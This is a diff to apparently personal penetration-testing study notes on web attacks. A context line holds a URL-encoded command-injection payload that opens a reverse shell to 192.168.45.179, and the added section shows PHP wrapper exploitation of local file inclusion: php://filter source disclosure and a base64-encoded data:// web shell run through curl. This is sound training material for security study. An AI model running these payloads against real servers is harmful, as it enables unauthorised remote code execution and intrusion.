@@ -48,8 +48,6 @@ https://www.urlencoder.org/
 - Becomes: username=user1&password=pass1&ffa=testmfa"%26%26bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.179%2F7171%200%3E%261%22"
 	- So make sure to enclose command in "&&\<encodedcommand>" (incl. quotes).
 
-
-
 ## LFI
 - Executing a file on the server, though we may have to modify it first somehow.  
 - Ex: if the server stores access logs, modify the access log such that it contains our code, perhaps in the user agent field.
@@ -65,6 +63,23 @@ Firefox/91.0"
 	- On a Windows target running XAMPP, the Apache logs can be found in C:\xampp\apache\logs\.
 	- On a Linux target Apache’s access.log file can be found in the /var/log/apache2/ directory.
 - There are other examples of LFI, including uploading a reverse shell to a web application and calling it through the URL. The above is just one example of the concept. 
+
+### PHP Wrappers
+Note that in order to exploit these vulnerabilites, the allow_url_include setting needs to be enabled for PHP, which is not the case for default installations. That said, it is included in the material, so it makes sense to be aware of it. 
+Ex: exploiting a page called admin.php
+-  curl http://\<host>/\<directory>/index.php?page=admin.php
+-  Note that if the /<body> tag is not closed (with a \</body> tag at the end), the page could be vulnerable. Let's try to exploit it with the **php://filter** tag. 
+	1. curl http://\<host>/\<directory>/index.php?page=php://filter/**convert.base64-encode**/resource=admin.php
+		- This should return the whole page which can then be decoded for further information. 
+	2. echo "\<base64 text>" | base64 -d 
+- Now let's try with the **data://** warpper. 
+	1. curl "http://\<host>/\<directory>/index.php?page=**data://text/plain**,<?php%20echo%20system('ls');?>"
+		- This shows that we can execute embeeded data via LFI. 
+	2. But because some of our data like "system" may be filtered, we can encode it with base64 and try again. 
+	3. echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+		- PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+	4. "http://\<host>/\<directory>/index.php?page=**data://text/plain;base64**,PD9waHAgZW
+NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 
 ## RFI
 - Executing on our file on the server. 
